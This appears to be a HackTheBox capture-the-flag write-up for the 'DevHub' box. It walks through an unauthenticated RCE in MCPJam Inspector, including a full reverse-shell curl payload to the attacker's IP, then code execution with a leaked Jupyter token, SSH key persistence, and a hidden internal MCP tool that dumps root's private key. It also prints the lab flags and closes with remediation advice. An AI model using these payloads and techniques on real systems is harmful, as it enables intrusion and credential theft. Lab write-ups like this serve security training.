# HackTheBox — DevHub (Medium) Penetration Test Report

**Target:** devhub.htb (10.129.245.216)
**Difficulty:** Medium
**Attacker Machine:** Kali Linux (10.10.14.105)

---

## 1. Summary

DevHub is a Linux (Ubuntu 24.04) box that simulates an internal developer platform exposing an MCP (Model Context Protocol) tooling ecosystem: an MCPJam Inspector instance, a Jupyter analytics environment, and a custom internal "OPSMCP" operations API. The box was rooted by chaining three vulnerabilities:

1. **Unauthenticated RCE in MCPJam Inspector** (CVE-2026-23744) → shell as `mcp-dev`.
2. **Leaked Jupyter auth token** in the process list → code execution as `analyst` via the Jupyter kernel WebSocket API.
3. **Hidden/undocumented "admin" tool in an internal MCP server (OPSMCP)** running as root → dumped root's SSH private key directly (a classic *MCP tool poisoning / hidden tool* vulnerability).

---

## 2. Recon

### 2.1 Nmap

```
nmap --privileged -Pn -A -oN nmapMedium.txt -v 10.129.245.216
```

Results (top 1000 ports only):

| Port | Service | Version |
|------|---------|---------|
| 22   | ssh     | OpenSSH 8.9p1 Ubuntu |
| 80   | http    | nginx 1.18.0 (Ubuntu) |

**Note:** Only the default top-1000 ports were scanned (`-p-` was not used), which is why other important services (MCPJam Inspector on 6274) were missed initially.

### 2.2 Web Enumeration

Added `devhub.htb` to `/etc/hosts` and browsed to `http://devhub.htb`. The landing page was a static "DevHub - Internal Development Platform" page advertising three internal services:

- **MCP Inspector** — "Active - Port 6274"
- **Analytics Dashboard** (Jupyter) — "Internal Only - localhost:8888"
- **Code Repository** (Git) — "Maintenance Mode"

Confirmed via `curl -si http://devhub.htb/` that the page was fully static HTML/CSS with no client-side links or JS — meaning no further directory brute forcing was actually necessary; the real attack surface was the ports mentioned on the page.

### 2.3 Discovering Port 6274

Since nmap only scanned the top 1000 ports, port 6274 was checked manually:

```
curl -si http://10.129.245.216:6274/
```

This returned an HTML page titled **"MCPJam Inspector"** — a community-built alternative to Anthropic's official MCP Inspector tool, exposed directly on the target's network interface (not just localhost).

---

## 3. Initial Foothold — CVE-2026-23744 (MCPJam Inspector RCE)

### 3.1 Vulnerability

MCPJam Inspector versions ≤1.4.2 bind their HTTP API to `0.0.0.0` instead of `127.0.0.1`. The `/api/mcp/connect` endpoint (meant to configure/connect to an MCP server) accepts a `command` and `args` field and executes them **without any authentication or input validation**, resulting in unauthenticated remote code execution.

- Advisory: GHSA-232v-j27c-5pp6
- CVE: CVE-2026-23744
- Similar to CVE-2025-49596, but this variant requires **no user interaction**.

### 3.2 Exploitation

Started a listener on Kali:

```
nc -lvnp 4444
```

Sent the exploit payload to trigger a reverse shell (Linux `bash` payload adapted from the public PoC):

```
curl -s http://10.129.245.216:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.105/4444 0>&1"],"env":{}},"serverId":"pwn"}'
```

Result: reverse shell as **`mcp-dev`** (uid=1001).

```
whoami        # mcp-dev
id            # uid=1001(mcp-dev) gid=1001(mcp-dev)
pwd           # /opt/mcpjam/node_modules/@mcpjam/inspector
```

Shell was stabilized with:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Lateral Movement — mcp-dev → analyst

### 4.1 Enumeration

```
cat /etc/passwd            # revealed users: mcp-dev, analyst
ps aux                     # revealed running processes
ss -tulnp                  # revealed internal-only listening ports
```

Key finding in `ps aux`:

```
analyst  1106  ... /home/analyst/jupyter-env/bin/python3 jupyter-lab
         --ip=127.0.0.1 --port=8888 --no-browser
         --notebook-dir=/home/analyst/notebooks
         --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

The Jupyter Lab server's **authentication token was visible directly in the process command line**, readable by any local user via `ps aux`. This is a serious information-disclosure flaw — process arguments should never contain long-lived secrets.

Confirmed the token worked:

```
curl -s http://127.0.0.1:8888/api/status -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

### 4.2 Executing Code as analyst via Jupyter

`websocat` and Python's `websocket` module were unavailable on the box, but **Node.js v25** has a native, built-in `WebSocket` global, so a small script was used to talk directly to Jupyter's kernel channel over its REST + WebSocket API.

Created a kernel:

```
curl -s -X POST http://127.0.0.1:8888/api/kernels \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

This returned a kernel ID (e.g. `e410bdd1-bfbc-4907-9458-5dd8026ef4aa`).

Wrote `/tmp/exec.js` — a small script that opens a WebSocket to `/api/kernels/<id>/channels`, sends a Jupyter `execute_request` message, and prints any `stream`/`error` output:

```js
const KID = "<kernel_id>";
const TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7";
const CODE = process.argv[2];
const ws = new WebSocket(`ws://127.0.0.1:8888/api/kernels/${KID}/channels?token=${TOKEN}`);
ws.onopen = () => {
  const msg = {
    header: { msg_id: "m1", username: "a", session: "s1", msg_type: "execute_request", version: "5.3", date: new Date().toISOString() },
    parent_header: {}, metadata: {}, channel: "shell",
    content: { code: CODE, silent: false, store_history: false, user_expressions: {}, allow_stdin: false, stop_on_error: true },
    buffers: []
  };
  ws.send(JSON.stringify(msg));
};
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  if (data.msg_type === "stream") console.log(data.content.text);
  if (data.msg_type === "error") console.log("ERR:", data.content.ename, data.content.evalue);
  if (data.msg_type === "status" && data.content.execution_state === "idle") setTimeout(()=>process.exit(0), 300);
};
setTimeout(()=>process.exit(1), 8000);
```

Used it to run Python code **as `analyst`** (the Jupyter kernel process owner):

```
node /tmp/exec.js "import subprocess; print(subprocess.run(['id'],capture_output=True,text=True).stdout)"
# uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

### 4.3 Establishing Stable Access (SSH as analyst)

Generated an SSH key pair on Kali:

```
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
```

Used the Jupyter code-execution primitive to write the public key into `analyst`'s `authorized_keys`:

```
node /tmp/exec.js "import os; os.makedirs('/home/analyst/.ssh', exist_ok=True); \
open('/home/analyst/.ssh/authorized_keys','w').write('<PUBLIC_KEY>\n'); \
os.chmod('/home/analyst/.ssh',0o700); os.chmod('/home/analyst/.ssh/authorized_keys',0o600)"
```

Then connected directly:

```
ssh -i ~/.ssh/id_rsa analyst@devhub.htb
```

**User flag:** `cat /home/analyst/user.txt` → `f43aa7dd5cfcf5f9b487152da14b9915`

---

## 5. Privilege Escalation — analyst → root

### 5.1 Enumeration as analyst

```
sudo -l                     # required a password we didn't have — not viable
ps aux                      # found a root-owned process: /opt/opsmcp/server.py
ss -tulnp                   # found a second internal-only service on 127.0.0.1:5000
```

Probed the unknown service on port 5000:

```
curl -si http://127.0.0.1:5000/
```

```json
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
```

This is an internal "Operations MCP" server, running **as root**, guarded by an API key.

### 5.2 Finding the API Key

```
find / -iname "*opsmcp*" 2>/dev/null
```

```
/opt/opsmcp
/home/analyst/.opsmcp_key          <-- API key file, world-readable by analyst
/etc/systemd/system/opsmcp.service
```

```
cat /home/analyst/.opsmcp_key
# opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

### 5.3 Interacting with OPSMCP

Listed the documented tools:

```
curl -s http://127.0.0.1:5000/tools/list -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

```json
{"tools":["ops.system_status","ops.list_services","ops.check_disk","ops.view_logs"]}
```

All four tools returned static/canned data — no command injection or path traversal was achievable through them directly.

### 5.4 Verifying Restart-Based Privesc Path (Blocked)

Noticed `/etc/systemd/system/opsmcp.service` runs:

```
ExecStart=/home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
User=root
Restart=always
```

Since `/home/analyst/jupyter-env/bin/` (including the `python3` symlink) is **owned by `analyst`**, this is a potential privesc: replacing the `python3` symlink with a malicious script would let us run code as root the next time the service restarts. However:

```
systemctl restart opsmcp.service
```

This required root authentication via polkit and could not be completed without a password. Checked for other automatic-restart triggers (cron, polkit rules) — none were usable:

```
cat /etc/crontab
crontab -l
ls -la /etc/polkit-1/rules.d/
reboot          # also blocked — "Interactive authentication required"
```

*(This path was ultimately not needed — see 5.6 below. The symlink swap was reverted at the end of the engagement.)*

### 5.5 Running LinPEAS

Copied LinPEAS from Kali to the target using the analyst SSH access:

```
scp -i ~/.ssh/id_rsa /usr/share/peass/linpeas/linpeas.sh analyst@devhub.htb:/tmp/linpeas_real.sh
chmod +x /tmp/linpeas_real.sh
/tmp/linpeas_real.sh -a | tee /tmp/linpeas_out.txt
```

Notable findings:
- Kernel `5.15.0-179-generic` flagged as vulnerable to **CVE-2022-0847 (Dirty Pipe)** and **CVE-2022-0995 (watch_queue)** — viable backup privesc routes, not required in the end.
- `jupyter.service` and `opsmcp.service` both flagged for **writable systemd PATH entries** (`/home/analyst/jupyter-env/bin`), confirming the symlink-hijack theory above.
- Several world-writable root-owned Unix sockets (not required for this path).

### 5.6 Root Cause — Reading the OPSMCP Source

With `analyst` access (unlike `mcp-dev`, which got "Permission denied"), the source was readable:

```
cat /opt/opsmcp/server.py
```

The source revealed the **actual vulnerability**: a set of `HIDDEN_TOOLS` defined in the Flask app that are **not returned by `/tools/list`** but are still callable through `/tools/call`:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": { ... }
}
```

`ops._admin_dump` with `target="ssh_keys"` and `confirm=true` reads and returns `/root/.ssh/id_rsa` directly in the JSON response — a textbook **MCP hidden-tool / tool-poisoning vulnerability** (undocumented, high-privilege tools exposed on a "trusted" internal API with no extra authorization check beyond the same API key used for benign read-only tools).

### 5.7 Exploiting the Hidden Tool

```
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Response included:

```json
{"root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...", "target": "ssh_keys"}
```

(Note: the same hidden tool could also dump `target: "passwords"` and `target: "tokens"`, exposing password hashes/plaintext creds and internal API tokens for other services — further confirming this is a severe credential-disclosure bug, not just an SSH key leak.)

### 5.8 Root Access

Saved the dumped key locally and connected as root:

```
cat > ~/root_id_rsa <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 ~/root_id_rsa
ssh -i ~/root_id_rsa root@devhub.htb
```

**Root flag:** `cat /root/root.txt` → `56073888dbeb28d406583bfb2f4719d6`

---

## 6. Post-Exploitation Cleanup

Earlier in the engagement, the `python3` symlink in `analyst`'s virtualenv was renamed as a contingency privesc path (`python3` → `python3.real`, with a malicious wrapper substituted). Since the hidden-tool credential dump provided a cleaner path to root, this was reverted to restore the original state:

```
mv /home/analyst/jupyter-env/bin/python3.real /home/analyst/jupyter-env/bin/python3
```

---

## 7. Root Cause Summary & Recommendations

| Step | Vulnerability | Recommendation |
|------|----------------|-----------------|
| Initial foothold | MCPJam Inspector bound to `0.0.0.0`, unauthenticated RCE via `/api/mcp/connect` (CVE-2026-23744) | Upgrade to MCPJam Inspector ≥1.4.3; bind dev tools to `127.0.0.1` only; never expose developer tooling to a shared network |
| analyst pivot | Jupyter auth token passed as a CLI argument, visible in `ps aux` to any local user | Pass secrets via config files or environment variables with restricted permissions, not process arguments |
| Privesc (root) | Internal "OPSMCP" MCP server exposes hidden/undocumented tools (`ops._admin_dump`) that bypass the intended read-only tool surface and leak root's SSH key, password hashes, and API tokens | Never ship hidden/debug tools in production MCP servers; enforce strict allow-lists server-side (not just hide from `/tools/list`); apply least-privilege — this service should not run as root nor have filesystem access to `/root/.ssh` |
| Secondary vector (unused) | `opsmcp.service` / `jupyter.service` run as root/analyst respectively but reference a `python3` binary inside a directory owned by the low-privileged `analyst` user (writable systemd PATH) | Store virtualenvs used by root-run services in a root-owned, non-writable location |

---

## 8. Tools Used

- `nmap` — port/service scanning
- `curl` — manual HTTP/API probing and exploitation
- `nc` (netcat) — reverse shell listener
- Node.js (native `WebSocket`) — Jupyter kernel WebSocket API interaction (no `websocat`/`websocket-client` available on target)
- `ssh-keygen` / `ssh` / `scp` — key generation, stable access, file transfer
- `linpeas.sh` — automated Linux privilege escalation enumeration
